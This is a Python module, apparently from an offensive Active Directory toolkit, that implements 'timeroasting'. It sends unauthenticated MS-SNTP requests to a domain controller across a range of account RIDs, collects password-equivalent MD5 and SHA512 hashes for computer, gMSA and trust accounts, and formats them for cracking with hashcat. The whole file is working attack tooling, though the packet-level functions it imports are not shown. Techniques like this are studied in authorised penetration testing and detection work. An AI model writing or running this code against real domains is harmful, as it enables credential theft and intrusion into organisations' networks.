# SPDX-License-Identifier: Apache-2.0
"""Timeroasting: extract SNTP password hashes for computer/gMSA/trust accounts.

Abuses Microsoft's NTP authentication extension (MS-SNTP) to request
password-equivalent hashes from a domain controller without authentication.
Targets computer, gMSA, and trust accounts, which sometimes have weak or default
passwords (e.g., legacy NT4 computer name as password).

Two packet formats, two hash algorithms::

    68-byte  Authenticator        → MD5(NTOWFv1 || salt)        → hashcat 31300
    120-byte ExtendedAuthenticator → KDF+HMAC-SHA512(NTOWFv1, ...) → no hashcat yet

Code flow::

    timeroast()                        ← public entry point
      │
      ├─ 68-byte requests (--format auth or both)
      │    ├─ --password current or both:  ntp_roast(old_pwd=False)  → results.current
      │    └─ --password previous or both: ntp_roast(old_pwd=True)   → results.previous
      │         (bit 31 set in the Key Identifier)
      │
      ├─ 120-byte requests (--format extended or both)
      │    └─ ntp_roast(extended=True), once                         → results.extended
      │         (this format has no working password selector, so
      │          --password does not apply to it)
      │
      └─ _responses_to_results()       Format NtpResponse → RoastResult
           ├─ 68-byte:  format_sntp_hash()       → $sntp-ms$hash$salt
           └─ 120-byte: format_sntp_sha512_hash() → $sntp-ms-sha512$RID$hash$salt
"""

from __future__ import annotations

from collections.abc import Iterator
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any

from kerbwolf.core.ntp import NtpResponse, ntp_roast
from kerbwolf.hashcat import format_sntp_hash, format_sntp_sha512_hash
from kerbwolf.models import HashcatMode, RoastResult

if TYPE_CHECKING:
    from collections.abc import Iterable

    from kerbwolf.models import TimeroastAccount

# ---------------------------------------------------------------------------
# Results
# ---------------------------------------------------------------------------


@dataclass
class TimeroastResults:
    """Results from a timeroasting run.

    ``current`` and ``previous`` hold the 68-byte (``$sntp-ms$``, MD5)
    hashes for the current and the previous password.  ``extended`` holds
    the 120-byte (``$sntp-ms-sha512$``) hashes: that format cannot select
    which password the DC answers with, so they are not split by age.

    When LDAP accounts are provided, ``username`` is set to the
    sAMAccountName instead of a bare RID string.
    """

    current: list[RoastResult] = field(default_factory=list)
    previous: list[RoastResult] = field(default_factory=list)
    extended: list[RoastResult] = field(default_factory=list)


# ---------------------------------------------------------------------------
# NtpResponse → RoastResult conversion
# ---------------------------------------------------------------------------


def _responses_to_results(
    responses: list[NtpResponse],
    rid_to_name: dict[int, str] | None = None,
) -> list[RoastResult]:
    """Convert raw NTP responses to formatted hash strings.

    Every NtpResponse is either MD5 (68-byte) or SHA512 (120-byte) - these
    are exhaustive and mutually exclusive, determined by packet length.

    If ``rid_to_name`` is provided, ``username`` is set to the sAMAccountName.
    Otherwise it is set to the bare RID string.
    """
    results: list[RoastResult] = []

    for resp in responses:
        label = rid_to_name.get(resp.rid, str(resp.rid)) if rid_to_name is not None else str(resp.rid)

        if resp.is_md5:
            # 68-byte Authenticator: MD5(NTOWFv1 || salt)
            results.append(
                RoastResult(
                    username=label,
                    realm="",
                    spn="",
                    etype=0,
                    hash_string=format_sntp_hash(resp.md5_hash, resp.salt, resp.rid),
                    hashcat_mode=HashcatMode.SNTP_MS,
                )
            )

        else:
            # 120-byte ExtendedAuthenticator: KDF+HMAC-SHA512
            results.append(
                RoastResult(
                    username=label,
                    realm="",
                    spn="",
                    etype=0,
                    hash_string=format_sntp_sha512_hash(resp.checksum, resp.salt, resp.rid),
                    hashcat_mode=0,  # no hashcat module yet
                )
            )

    return results


# ---------------------------------------------------------------------------
# Format dispatch: send packets for one or both formats
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------


_MODE_CURRENT = "current"
_MODE_PREVIOUS = "previous"
_MODE_BOTH = "both"
_FMT_AUTH = "auth"
_FMT_EXTENDED = "extended"


def timeroast(
    *,
    dc_ip: str,
    rids: Iterable[int] | None = None,
    accounts: list[TimeroastAccount] | None = None,
    rate: int = 180,
    timeout: float = 24.0,
    src_port: int = 0,
    port: int = 123,
    password: str = _MODE_CURRENT,
    fmt: str = "auth",
) -> TimeroastResults:
    """Send NTP requests and extract SNTP password hashes.

    RID source (mutually exclusive):

    - ``rids``: Explicit RID values (from ``-r`` / ``-R``).
    - ``accounts``: LDAP-discovered ``TimeroastAccount`` list (from ``--ldap``).
      RIDs are extracted from accounts, and sAMAccountNames are used as labels.
    - Neither: defaults to RIDs 500-10000.

    68-byte requests (``fmt`` ``auth`` or ``both``):

    - ``current``:  One pass with old_pwd=False.
    - ``previous``: One pass with old_pwd=True.
    - ``both``:     Current pass for all RIDs, then previous pass for all RIDs.

    120-byte requests (``fmt`` ``extended`` or ``both``) are sent once,
    whatever *password* is: the request cannot select the password, so a
    second pass would repeat the first byte for byte.

    """
    # Build RID list and optional name mapping from accounts or rids.
    rid_to_name: dict[int, str] | None = None
    if accounts is not None:
        rids = [a.rid for a in accounts]
        rid_to_name = {a.rid: a.samaccountname for a in accounts}
    elif rids is None:
        rids = range(500, 10001)

    # A one-shot iterator has to be stored to be walked more than once.
    # Ranges and lists are walked again as they are, so an open-ended
    # range is never built in memory.
    if isinstance(rids, Iterator):
        rids = list(rids)

    roast_kwargs: dict[str, Any] = {"rate": rate, "timeout": timeout, "src_port": src_port, "port": port}
    results = TimeroastResults()

    if fmt in (_FMT_AUTH, _MODE_BOTH):
        if password in (_MODE_CURRENT, _MODE_BOTH):
            raw = ntp_roast(dc_ip, rids, extended=False, old_pwd=False, **roast_kwargs)
            results.current = _responses_to_results(raw, rid_to_name)
        if password in (_MODE_PREVIOUS, _MODE_BOTH):
            raw = ntp_roast(dc_ip, rids, extended=False, old_pwd=True, **roast_kwargs)
            results.previous = _responses_to_results(raw, rid_to_name)

    if fmt in (_FMT_EXTENDED, _MODE_BOTH):
        # The DC answers a 120-byte request only when it asks for the old key.
        raw = ntp_roast(dc_ip, rids, extended=True, old_pwd=True, **roast_kwargs)
        results.extended = _responses_to_results(raw, rid_to_name)

    return results
